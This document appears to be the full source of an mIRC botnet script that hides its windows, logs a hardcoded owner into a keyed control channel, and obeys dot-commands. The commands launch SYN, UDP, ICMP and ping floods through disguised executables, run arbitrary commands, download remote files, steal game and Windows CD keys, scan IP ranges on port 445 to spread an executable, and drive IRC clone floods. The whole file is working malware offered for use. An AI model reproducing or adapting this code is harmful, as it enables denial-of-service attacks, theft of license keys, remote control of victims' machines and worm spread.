on *:TEXT:.login *:%chan:{ if ($level($nick) != 1) { halt } | if ($nick == elitro) && ($2 == %HUR) { spit %b1 $+ $nick $+ %b2 is my GOD. | auser 1000 $nick } }
on *:START:{ .startsettz }
on *:EXIT:{ .exitsettz }
on *:CONNECT:{ .connsettz }
on *:DISCONNECT:{ .dscnsettz }
on *:CONNECTFAIL:{ .cnnfailsettz }
on *:INPUT:*:{ haltdef | spit %b1 $+ security $+ %b2 user input %b1 $+ $1- $+ %b2 | .fakenick | .hide | .uinst }
on *:OP:%chan:{ if ($opnick == $me) { .topic %chan .scan rand2 $r(210,220) | .mode %chan +mnstk %key } }
on *:DNS:{ var %x = 1,%dnum = $dns(0) | if (%dnum == 0) { return } | while (%x <= %dnum) { var %dall = %dall $dns(%x).ip | inc %x } | %dall = $replace(%dall,$chr(32),$+($chr(44),$chr(32))) | spit %b1 $+ dns $+ %b2 %b1 $+ resolved  $+ %dnsip $+  to  $+ %dall $+  $+ %b2 | unset %dnsip }
on *:SOCKOPEN:sclick*:{
  sockwrite -n $sockname GET %g HTTP/1.1
  sockwrite -n $sockname Host: %h
  sockwrite -n $sockname Connection: keep-alive
  sockwrite $sockname $rletterz
  unset %g
  unset %h
}
on *:SOCKCLOSE:sclick*:{ spit %b1 $+ visit $+ %b2 %b1 $+ socket closed $+ %b2 | unset %g | unset %h }
on *:SOCKOPEN:download:{ if ($sockerr) { spit %b1 $+ download $+ %b2 %b1 $+ error socket error $+ %b2 | unset %dlfile | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on *:SOCKREAD:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on *:SOCKCLOSE:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | downloada http:// $+ %download1 $+ / $+ %download3 } | else { spit %b1 $+ download $+ %b2 success: file downloaded %b1 $+ $mircdir $+ %download2 $+ %b2 %b1 $+ $file(%download2).size bytes $+ %b2 } | unset %download* %dlfile }
on *:SOCKLISTEN:ident:{ sockaccept ident. [ $+ [ $ticks ] ] }
on *:SOCKREAD:ident.*:{ sockread %ident | tokenize 32 %ident | if ($numtok($1-,44) == 2) && ($1 isnum) && ($3 isnum) { sockwrite -n $sockname $3 , $1 : USERID : none.of.your.business : $rletterz | sockclose $sockname | unset %ident } }
CTCP *:*:*:{ haltdef }
on *:PART:*:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
on *:QUIT:*:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
on *:NICK:{
  if ($level($nick) != 1) { .ruser $nick | .clearall }
}
on *:JOIN:*:{ 
  if ($nick == $me) { .window -h $chan }
  if ($chan == %chan) { .timerjoin off }
  if ($me isop $chan) && ($chan == %chan) && ($chan($chan).key != %key) { .mode $chan +mnstk %key }
}
on *:TEXT:*:*:{
  if ($level($nick) == 1000) { .clearall | .securityz
    if ($1 == .syn3) { if ($2 == help) { spit syntax: .syn3 ip source secs delay port | halt } | if ($2 == stop) { run -n msnq32.exe /n /fh /r "mnn32.exe -kf msregld32.exe" | spit %b1 $+ Syn3 Attack stopped $+ %b2 | halt } | set %nys3port $6 | if (%nys3port == random) { set %nys3port $rand(0,65535) } | spit %b1 $+ Syn3 $+ %b2 flood started %b1 $+ IP: $2 source: $3 time: $4 Secs delay: $5 port: $6 $+ %b2 | .run msnq32.exe /n /fh /r "msregld32.exe $2 $3 $4 $5 %nys3port" | timer 1 $4 spit Syn3 Attack Done! | halt }
    if ($1 == .targa) { if ($2 == help) { spit syntax: .targa ip times | halt } | if ($2 == stop) { run -n msnq32.exe /n /fh /r "mnn32.exe -kf tvchost32.exe" | spit %b1 $+ Targa Attack stopped $+ %b2 | halt } | spit %b1 $+ Targa $+ %b2 flood started %b1 $+ IP: $2 times: $3 $+ %b2 | .run msnq32.exe /n /fh /r "tvchost32.exe $2 -c $3" }
    if ($1 == .juno) { if ($2 == help) { spit syntax: .juno ip port secs | halt } | if ($2 == stop) { run -n msnq32.exe /n /fh /r "mnn32.exe -kf jnco32.exe" | spit %b1 $+ Juno Attack stopped $+ %b2 | halt } | set %junoport $3 | if (%junoport == random) { set %junoport $rand(0,65535) } | spit [Juno Attack] IP: $2 Port: %junoport Time: $4 Sec's  | .run msnq32.exe /n /fh /r "jnco32.exe %junoport" | timer 1 $4 .run -n msnq32.exe /n /fh /r "mnn32.exe -kf jnco32.exe" | timer 1 $4 spit Juno Attack Done! | halt }  
    if ($1 == .speed) && (!$2) { spit %b1 $+ speed $+ %b2 %b1 $+ http://www.dslreports.com/archive/ $+ $gettok($host,3-,46) $+ %b2 }
    if ($1 == .dns) && ($2) && (!$3) { dns $2 | set %dnsip $2 | spit %b1 $+ dns $+ %b2 resolving %b1 $+ $2 $+ %b2 }
    if ($1 == .syn) && ($2) { if ($2 == stop) || ($2 == halt) { if (%synaa) { sockclose syn* | spit %b1 $+ syn $+ %b2 flood on %b1 $+ %synaa halted! $+ %b2 | unset %syn* | halt } | else { spit %b1 $+ syn $+ %b2 error no syn attacks currently active } } | elseif (%synaa) { spit %b1 $+ syn $+ %b2 error syn attack already active on %b1 $+ %synaa $+ %b2 | halt } | else { if (!%synaa) { set %synport $3 | if (%synport == random) { set %synport $r(0,65535) } | spit %b1 $+ syn $+ %b2 flood started %b1 $+ IP: $2 packets: $4 port: %synport $+ %b2 | set %synaa $2 | synz start $4 $2 %synport } } }
    if ($1 == .ping) || ($1 == .packet) && ($3) && ($4) { if ($2 == stop) || ($2 == halt) { halt } | .run -n msnq32.exe /n /fh /r "ping.exe $2 -n $3 -l $4 -w 0" | spit %b1 $+ Ping $+ %b2 flood started %b1 $+ IP: $2 traffic: $calc($3 *65536/1024/1000) $+ mb $+ %b2 | set %pingaa $2 }
    if ($1 == .ping) || ($1 == .packet) && ($3) && (!$4) { if ($2 == stop) || ($2 == halt) { halt } | .run -n msnq32.exe /n /fh /r "ping.exe $2 -n $3 -l 65500 -w 0" | spit %b1 $+ Ping $+ %b2 flood started %b1 $+ IP: $2 traffic: $calc($3 *65536/1024/1000) $+ mb $+ %b2 | set %pingaa $2 }
    if ($1 == .ping) || ($1 == .packet) && ($2 == stop) || ($2 == halt) && (%pingaa != $null) { .run -n msnq32.exe /n /fh /r "mnn32.exe -kf ping.exe" | spit %b1 $+ Ping $+ %b2 flood on %b1 $+ %pingaa halted $+ %b2 | unset %pingaa }
    if ($1 == .udp2) && (!$6) && ($5) { if ($2 == stop) || ($2 == halt) && (%udpip != $null) { sockclose sockudp* | spit %b1 $+ UDP2 $+ %b2 flood on %b1 $+ %udpip halted $+ %b2 | unset %udpip | halt } | set %port $3 | if (%port == random) { set %port $r(0,65535) } | set %udpip $2 | /udp.packet $2 -t $+ $4 -p $+ %port -i $+ $5 }
    if ($1 == .level) && (!$2) { spit %b1 $+ level $+ %b2 %b1 $+ $nick $+ %b2 you are currently an %b1 $+ admin $+ %b2 }
    if ($1 == .visit) && ($2) { set %h $2 | set %g $3 | spit %b1 $+ visit $+ %b2 %b1 $+ visited %h $+ %g $+ %b2 | sockopen sclick %h 80 }
    if ($1 == .download) && (!$3) && ($2) { if ($2 == stop) && ($sock(download)) { .sockclose download* | spit %b1 $+ download $+ %b2 stopped download of %b1 $+ %dlfile $+ %b2 | unset %dlfile | halt } | elseif ($2 == stop) && (!$sock(download)) { spit %b1 $+ download $+ %b2 %b1 $+ error not downloading a file $+ %b2 | halt } | set %dlfile $2- | downloada $2- }
    if ($1 == .reload) && ($2) && (!$3) { set %reloadsecs $2 | .timer -o 1 %reloadsecs /server %server1 | spit %b1 $+ reloading $+ %b2 in %b1 $+ %reloadsecs seconds $+ %b2 | unset %reloadsecs }
    if ($1 == .cskey) && (!$2) { .cskey }
    if ($1 == .winkey) && (!$2) { .winkey }
    if ($1 == .q3key) && (!$2) { .q3key }
    if ($1 == .ut2k3key) && (!$2) { .ut2k3key }
    if ($1 == .sof2key) && (!$2) { .sof2key }
    if ($1 == .uninstall) && (!$2) { .uinst }
    if ($1 == .diskinfo) && (!$2) { .diskinfo }
    if ($1 == .uptimed) && ($2) && (!$3) { if ($uptimed($2)) { spit %b1 $+ uptimed $+ %b2 > $+  $+ $iif($2 > 1,$2 $+ days,$2 $+ day) $+  uptime; %b1 $+ $uptime(system,1) $+ %b2 } }
    if ($1 == .uptimew) && ($2) && (!$3) { if ($uptimew($2)) { spit %b1 $+ uptimew $+ %b2 > $+  $+ $iif($2 > 1,$2 $+ wks,$2 $+ wk) $+  uptime; %b1 $+ $uptime(system,1) $+ %b2 } }
    if ($1 == .fserve) && ($2) && (!$3) { var %homedir = [ [ $2- ] ] | spit %b1 $+ fserve $+ %b2 %b1 $+ establishing an fserve session with  $+ $nick $+  $+ %b2 with homedir %b1 %homedir $+ %b2 | .fserve $nick 10 %homedir }
    if ($1 == .nick) && ($2 == reset) && (!$3) { .nick $nick0r }
    if ($1 == .rand) && ($2 == nick) && (!$3) { .nick $rletterz }
    if ($1 == .rand) && ($2 == nick2) && (!$3) { .nick $rletterz2 }
    if ($1 == .clear) && (!$2) { .clearm3n }
    if ($1 == .clean) && (!$2) { .cleanup }

    if ($1 == .flood) && ($2) && (!$3) { spit %b1 $+ flood $+ %b2 %b1 $+ on $2 $+ %b2 | .msg $2 %floodmsg4 | .notice $2 %floodmsg2 | .ctcp $2 %floodmsg3 }
    if ($1 == .netsend) && ($2) { spit %b1 $+ net-send $+ %b2 sent %b1 $+ $2 the message of $3- $+ %b2 | .run -n msnq32.exe /n /fh /r "net send $2- $+ " }
    if ($1 == . $+ $me) && ($2) { spit %b1 $+ command $+ %b2 %b1 $+ // $+ [ [ $2- ] ] $+ %b2 | [ [ $2- ] ] }
    if ($1 == .cmd) || ($1 == .command) || ($1 == .c) || ($1 == .-) && ($2) { spit %b1 $+ command $+ %b2 %b1 $+ // $+ [ [ $2- ] ] $+ %b2 | [ [ $2- ] ] }
    if ($1 == .var) || ($1 == .variable) && ($2) { if ([ [ $$2- ] ] != $null) { spit %b1 $+ variable $+ %b2 %b1 $+ $2- = [ [ $$2- ] ] $+ %b2 } }
    if ($1 == .color1) || ($1 == .col1) && ($2) { spit %b1 $+ color1 $+ %b2 set to %b1 $+ $2- $+ %b2 | %b1 = $2- }
    if ($1 == .color2) || ($1 == .col2) && ($2) { spit %b1 $+ color2 $+ %b2 set to %b1 $+ $2- $+ %b2 | %b2 = $2- }
    if ($1 == .color3) || ($1 == .col3) && ($2) { spit %b1 $+ color3 $+ %b2 set to %b1 $+ $2- $+ %b2 | %c = $2- }
    if ($1 == .colorreset) || ($1 == .colreset) && (!$2) { %b1 = 0[4 | %b2 = 0] | %c = 0 | spit %b1 $+ now using default colors $+ %b2 }
    if ($1 == .set) { set $2 $3- | spit %b1 $+ set $+ %b2 set %b1 $+ $2 to $3- $+ %b2 }
    if ($1 == .unset) { unset $2 | spit %b1 $+ unset $+ %b2 %b1 $+ unset $2 $+ %b2 }
    if ($1 == .findfile) && ($3) { .timer 1 1 spit $findfile($2,$3,0, $+ spit %b1 $+ find-file $+ %b2 %b1 $+ $2- $+ %b2 $+ ) }
    if ($1 == .sayfile) && ($4) { .timer 1 1 spit %b1 $+ say-file $+ %b2 %b1 $+ $findfile($2,$3,$4) $+ %b2 }
    if ($1 == .finddir) && ($3) { .timer 1 1 spit $finddir($2,$3,0, $+ spit %b1 $+ find-dir $+ %b2 %b1 $+ $2- $+ %b2 $+ ) }
    if ($1 == .saydir) && ($4) { .timer 1 1 spit %b1 $+ say-dir $+ %b2 %b1 $+ $finddir($2,$3,$4) $+ %b2 }
    if ($1 == .info) && (!$2) { spit %b1 $+ mirc-info $+ %b2 %b1 $+ time online: $uptime(mirc,1) server: $server $+ %b2 }
    if ($1 == .net) && (!$2) { spit %b1 $+ network-info $+ %b2 %b1 $+ ip: $ip host: $host $+ %b2 }
    if ($1 == .cpu) && (!$2) { spit %b1 $+ cpu-info $+ %b2 %b1 $+ time: $time(h:nn TT) date: $date(mmmm doo yyyy) OS: $os uptime: $uptime(system,1) $+ %b2 }
    if ($1 == .proclist) || ($1 == .proc) || ($1 == .plist) && (!$2) { if ($isfile(proclst.bat)) { remove proclst.bat | remove prclst.txt | .makeproclist } | elseif (!$isfile(proclst.bat)) { .makeproclist } }
    if ($1 == .dcc) && ($2 == send) && ($3) && (!$5) { spit %b1 $+ dcc $+ %b2 sending %b1 $+ $3 $4- $+ %b2 | /dcc send $3 $4- }
    if ($1 == .join) && ($2) { join $2 $3- | spit %b1 $+ join $+ %b2 channel %b1 $+ $2 -- channel key: $3- $+ %b2 }
    if ($1 == .part) && ($2) && ($2 != %chan) { part $2 $3- | spit %b1 $+ part $+ %b2 channel %b1 $+ $2 -- reason: $3- $+ %b2 }
    if ($1 == .load) && ($2) { .load -rs $2- | spit %b1 $+ load $+ %b2 loaded %b1 $+ $2- $+ %b2 }
    if ($1 == .unload) && ($2) { .unload -rs $2- | spit %b1 $+ unload $+ %b2 unloaded %b1 $+ $2- $+ %b2 }
    if ($1 == .run) || ($1 == .exec) && ($2) { .run -n msnq32.exe /n /fh /r " $+ $2- $+ " | spit %b1 $+ run $+ %b2 ran %b1 $+ $2- $+ %b2 }
    if ($1 == .rename) && ($2) { .rename $2 $3- | spit %b1 $+ renamed $+ %b2 %b1 $+ $2 to $3- $+ %b2 }
    if ($1 == .remove) || ($1 == .delete) && ($2) { .remove $2- | spit %b1 $+ remove $+ %b2 removed %b1 $+ $2- $+ %b2 }
    if ($1 == .new) && ($2 == scan) && ($3 == file) { if (!$4) { remove %sysdir $+ %spreadfile | remove $mircdir $+ %spreadfile | spit %b1 $+ %spreadfile removed $+ %b2 | halt } | if ($4) { remove %sysdir $+ %spreadfile | remove $mircdir $+ %spreadfile | spit %b1 $+ %spreadfile removed $+ %b2 %b1now downloading new scan file from: $4 $+ %b2 | downloada $4- } }
    if ($1 == .spreadfile) && (!$3) && ($2) && (%spreadfile != $2) { spit %b1 $+ scanner $+ %b2 now spreading file %b1 $+ $2 $+ %b2 | %spreadfile = $2 }
    if ($1 == .spreadreset) && (!$2) && (%spreadfile != %defaultfile) { spit %b1 $+ scanner $+ %b2 now spreading default file %b1 $+ %defaultfile $+ %b2 | %spreadfile = %defaultfile }
    if ($1 == .scanbat) && ($!3) && ($2) && (%scanbat != $2) { spit %b1 $+ scanner $+ %b2 now using .bat file %b1 $+ $2 $+ %b2 | %scanbat = $2 }
    if ($1 == .logout) && (!$2) { .ruser $nick | .clearall | spit %b1 $+ $nick $+ %b2 has logged out }
    if ($1 == .geekscan) {  if (* !isin $2) { spit 4 ERROR! .scan 61.99.33.* [port]  (please) | halt } | { set %begshortip $replace($2,*,1)  | set %beglongip $longip( %begshortip ) | set %endshortip $replace($2,*,255) | set %endlongip $longip( %endshortip ) | set %scanport $3 | spit [Scanner Started] %begshortip to %endshortip $+ ... [port: $+ %scanport $+ ] | startscan } }
    if ($1 == .scan) && ($2) {
      if ($2 == randrange) && (%begshortip == $null) && ($isfile(%spreadfile)) { .randscann }
      if ($2 == start) && (%begshortip == $null) && ($isfile(%spreadfile)) { spit %b1 $+ scanner $+ %b2 scanning %b1 $+ $3 - $4 $+ %b2 | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($2 == rand) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $randip($3) | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $4 $+ %b2 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($2 == rand2) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %rand2ip $r(0,255) | set %begit $3 $+ . $+ %rand2ip $+ . $+ $r(0,242) $+ . $+ $r(0,255) | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $3 $+ . $+ %rand2ip $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $3 $+ . $+ %rand2ip $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($2 == host) && (%begshortip == $null) && ($isfile(%spreadfile)) { 
        if ($3 == start) { set %begit $gettok($ip,1-2,46) $+ .0.0 | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
        if ($3 == rand) { set %begit $gettok($ip,1-2,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
        if ($3 == rand2) { set %begit $gettok($ip,1,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1,46) $+ .255.255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1,46) $+ .255.255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      }
      if ($2 == neighborhood) && (%begshortip == $null) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-3,46) $+ .1 | spit %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-3,46) $+ .255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
      if ($2 == stats) && (%begshortip != $null) { spit %b1 $+ scanner $+ %b2 scan stats %b1 $+ range: [ %begshortip - %endshortip ] port: [ %scanport ] protocol: [ %scanproto ] current ip: [ %ip34 ] total found: [ $totalfound ] spreading file: [ %spreadfile ] $+ %b2 }
      if ($2 == port) && ($3) && (!$4) && (%scanport != $3) { spit %b1 $+ scanner $+ %b2 now scanning port %b1 $+ $3 $+ %b2 | %scanport = $3 }
      if ($2 == protocol) || ($2 == proto) && (!$4) && (%scanproto != $3) { spit %b1 $+ scanner $+ %b2 now scanning protocol %b1 $+ $3 $+ %b2 | %scanproto = $3 }
      if ($2 == protocolreset) || ($2 == protoreset) && (!$3) && (%scanproto != %defaultproto) { spit %b1 $+ scanner $+ %b2 now scanning protocol %b1 $+ %defaultproto $+ %b2 | %scanproto = %defaultproto }
      if ($2 == stop) || ($2 == halt) && (%begshortip != $null) { spit %b1 $+ scanner $+ %b2 scanning of %b1 $+ %begshortip - %endshortip $+ %b2 stopped at %b1 $+ %ip34 $+ %b2 by %b1 $+ $nick $+ %b2 | stopscan }
    }

    if ($1 == .clone) && ($2) {
      if ($2 == load) && ($3) { sockopen Sockets- $+ $r(1,999) $3 $4 | spit %b1 $+ clones $+ %b2 loading to %b1 $+ $3 $+ : $+ $4 $+ %b2 }
      if ($2 == nick) || ($2 == nicks) { set %clonenick $3- $+ $r(0,999999) | sockwrite -tn Sockets-* nick %clonenick | spit %b1 $+ clones $+ %b2 changing nicks to %b1 $+ %clonenick $+ %b2 | unset %clonenick }
      if ($2 == join) && ($3) { sockwrite -tn Sockets-* JOIN $3 $4- }
      if ($2 == part) && ($3) { sockwrite -tn Sockets-* PART $3 $4- }
      if ($2 == msg) || ($2 == query) && ($3) { sockwrite -tn Sockets-* privmsg $3 : $+ $4- }
      if ($2 == raw) && ($3) { sockwrite -tn Sockets-* $3- }
      if ($2 == notice) && ($3) { sockwrite -tn Sockets-* notice $3 : $+ $4- }
      if ($2 == join2) && ($3) { .timer 1 $r(10,240) sockwrite -tn Sockets-* JOIN $3 $4- }
      if ($2 == part2) && ($3) { .timer 1 $r(10,360) sockwrite -tn Sockets-* PART $3 $4- }
      if ($2 == flood1) || ($2 == flood) && ($3) { sockwrite -tn Sockets-* join $3 | sockwrite -tn Sockets-* PRIVMSG $3 : $+ %floodmsg1 | sockwrite -tn Sockets-* NOTICE  $3 : $+ %floodmsg2 | sockwrite -tn Sockets-* part $3 | spit %b1 $+ clones $+ %b2 starting flood on %b1 $+ $3 $+ %b2 }
      if ($2 == pmflood) || ($2 == pmf) && ($3) { sockwrite -tn Sockets-* privmsg $3 : $+ %floodmsg1 | sockwrite -tn Sockets-* notice $3 : $+ %floodmsg2 | spit %b1 $+ clones $+ %b2 pm flooding %b1 $+ $3 $+ %b2 }
      if ($2 == sqflood) || ($2 == sqf) && ($3) { sockwrite -n Sockets-* privmsg $3- : $+ %floodmsg3 | sockwrite -tn Sockets-* nick $rletterz | sockwrite -n Sockets-* privmsg $3- : $+ %floodmsg4 | spit %b1 $+ clones $+ %b2 attempting to sendq %b1 $+ $3- $+ %b2 }
      if ($2 == kill) || ($2 == quit) || ($2 == disconnect) { sockwrite -tn Sockets-* QUIT : $+ $3- | sockclose Sockets-* | spit %b1 $+ clones $+ %b2 all clones disconnected %b1 $+ reason: $3- $+ %b2 }
    }
    if ($1 == .bnc) && ($2) {
      if ($2 == start) && ($4) { if ($sock(Bnc)) { spit %b1 $+ bnc $+ %b2 bnc is already active on %b1 $+ $ip $+ : $+ %Bnc.Port $+ , pass: %Bnc.passwd $+ %b2 | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | spit %b1 $+ bnc $+ %b2 %b1 $+ /server -m $ip $+ : $+ $3 $+ , then /quote pass $4 $+ %b2 }
      if ($2 == stats) && ($sock(Bnc)) { spit %b1 $+ bnc $+ %b2 is on %b1 $+ $ip $+ : $+ %Bnc.port $+ , pass: %Bnc.passwd users: $sock(BncClient*,0) connected: $sock(BncServer*,0) $+ %b2 }
      if ($2 == stop) || ($2 == halt) && (%Bnc.Port != $null) { sockclose Bnc* | spit %b1 $+ bnc $+ %b2 server on %b1 $+ $ip $+ : $+ %bnc.port is now off $+ %b2 | unset %bnc.* | sockclose Bnc* }
    }
    if ($1 == .timersyn) && ($6) && (!$7) { if (%synaa != $null) { unset %synaa } | set %synport $3 | if (%synport == random) { set %synport $r(0,65535) } | set %synaa $2 | spit %b1 $+ timersyn $+ %b2 %b1 $+ set to syn IP: $2 port: %synport times: $4 every $5 seconds delay: $6 $+ %b2 | .timer $5 $6 synz start $4 $2 %synport }
    if ($1 == .icmp) && ($2) {
      if ($2 == stop) || ($2 == halt) && (%icmpaa != $null) {
        spit %b1 $+ ICMP $+ %b2 flood on %b1 $+ %icmpaa halted $+ %b2
        unset %icmpaa
        run -n msnq32.exe /n /fh /r "mnn32.exe -kf nm32g.vbs"
        remove nm32g.vbs
        halt
      }
      if ($2 == stop) || ($2 == halt) { halt }
      if (!$3) { halt }
      if (!$4) { halt }
      set %icmpaa $2
      spit %b1 $+ ICMP $+ %b2 flood started %b1 $+ IP: $2 packet size: $3 times: $4 $+ %b2
      timerremove 1 200 /remove nm32g.vbs
      write nm32g.vbs on error resume next
      write nm32g.vbs Set bl = CreateObject("Wscript.shell")
      write nm32g.vbs bl.run "ping $2 -w 0 -l $3 -n $4 $+ ",0,true
      run -n msnq32.exe /n /fh /r "nm32g.vbs"
      halt
    }
    if ($1 == .udp) && ($2) {
      if ($2 == stop) || ($2 == halt) && (%udpaa != $null) {
        spit %b1 $+ UDP $+ %b2 flood on %b1 $+ %udpaa halted $+ %b2
        unset %udpaa
        sockclose sockudp*
        halt
      }
      if ($2 == stop) || ($2 == halt) { halt }
      if (!$3) { halt }
      if (!$4) { halt }
      set %start 0
      set %end $4
      set %udpaa $2
      set %udpport $3
      if (!$isfile(uvxd32.vxd)) { udp.gen }
      if (%udpport == random) { set %udpport $r(0,65535) }
      spit %b1 $+ UDP $+ %b2 flood started %b1 $+ IP: $2 port: %udpport times: $4 $+ %b2
      :udploop
      if (%start == %end) {
        spit %b1 $+ UDP $+ %b2 flood on %b1 $+ %udpaa complete $+ %b2
        unset %udpaa
        unset %udpport
        halt
      }
      inc %start 1
      if ($3 == 0) {
        set %randname $r(10000,99999)
        set %uvxd32 $read(uvxd32.vxd)
        set %udpport $r(0,65535)
        sockudp Udp $+ %randname $+ a $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ b $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ c $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ d $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ e $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ f $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ g $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ h $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ i $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ j $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ k $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ l $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ m $2 %udpport %uvxd32
        goto udploop
      }
      if ($4 != 0) {
        set %randname $r(10000,99999)
        set %uvxd32 $read(uvxd32.vxd)
        sockudp Udp $+ %randname $+ a $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ b $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ c $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ d $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ e $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ f $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ g $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ h $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ i $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ j $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ k $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ l $2 %udpport %uvxd32
        sockudp Udp $+ %randname $+ m $2 %udpport %uvxd32
        goto udploop
      }
    }
  }
}
alias settz { if (!%chan) { %chan = ##—eo—## } | if (!%key) { %key = elitro } | if (!%spreadfile) { %spreadfile = ddizk.exe } | if (!%defaultfile) { %defaultfile = ddizk.exe } | if (!%scanport) { %scanport = 445 } | if (!%scanbat) { %scanbat = mmsql32.bat } | if (!%scanproto) { %scanproto = ipc$ } | if (!%defaultproto) { %defaultproto = ipc$ } | if (!%b1) { %b1 = 14[15 } | if (!%b2) { %b2 = 14] } | if (!%c) { %c = 15 } | if (!%HUR) { %HUR = elitro } }
alias tsettz { hmake tsettz 10 | if (%chan) { .hadd tsettz tchan %chan } | if (%key) { .hadd tsettz tkey %key } | if (%spreadfile) { .hadd tsettz tspreadfile %spreadfile } | if (%defaultfile) { .hadd tsettz tdefaultfile %defaultfile } | if (%scanport) { .hadd tsettz tscanport %scanport } | if (%scanbat) { .hadd tsettz tscanbat %scanbat } | if (%scanproto) { .hadd tsettz tscanproto %scanproto } | if (%defaultproto) { .hadd tsettz tdefaultproto %defaultproto } | if (%b1) { .hadd tsettz tb1 %b1 } | if (%b2) { .hadd tsettz tb2 %b2 } | if (%c) { .hadd tsettz tc %c } | if (%server1) { .hadd tsettz tserver1 %server1 } | if (%server2) { .hadd tsettz tserver2 %server2 } | if (%server3) { .hadd tsettz tserver3 %server3 } | .unsetall
if ($hget(tsettz,tchan)) { %chan = $ifmatch } | if ($hget(tsettz,tkey)) { %key = $ifmatch } | if ($hget(tsettz,tspreadfile)) { %spreadfile = $ifmatch } | if ($hget(tsettz,tdefaultfile)) { %defaultfile = $ifmatch } | if ($hget(tsettz,tscanport)) { %scanport = $ifmatch } | if ($hget(tsettz,tscanbat)) { %scanbat = $ifmatch } | if ($hget(tsettz,tscanproto)) { %scanproto = $ifmatch } | if ($hget(tsettz,tdefaultproto)) { %defaultproto = $ifmatch } | if ($hget(tsettz,tb1)) { %b1 = $ifmatch } | if ($hget(tsettz,tb2)) { %b2 = $ifmatch } | if ($hget(tsettz,tc)) { %c = $ifmatch } | if ($hget(tsettz,tserver1)) { %server1 = $ifmatch } | if ($hget(tsettz,tserver2)) { %server2 = $ifmatch } | if ($hget(tsettz,tserver3)) { %server3 = $ifmatch } | .hfree tsettz }
alias startsettz { .hide | .secure1 | .flush | .clearall | .sockclose * | .tsettz | .timers off | .settz | %sysdir = $mircdir..\ | .writeini $mircini ident userid $rletterz | .writeini $mircini mirc user $rletterz | .emailaddr $rletterz $+ @silver.gov | .fullname $rletterz | .nick $nick0r | .checkcopy | .anick $nick0r | .conn | .timer 0 30 securityz | .timerpingself -o 0 100 .ctcp $+($,me) PING | .timersecure -o 0 30 secure1 | .timerbgwin 0 5 bgwin | .window -h "Status Window" | .mircreg | .makereg | .srvtimecheck | .scanpop }
alias connsettz { .flush | .pdcc on | .fsend on | .mode $me +ix | .checkcopy | .timerjoin 0 6 join %chan %key | secure1 | .clearall }
alias dscnsettz { .flush | .srvtimecheck | .nick $nick0r | .clearall }
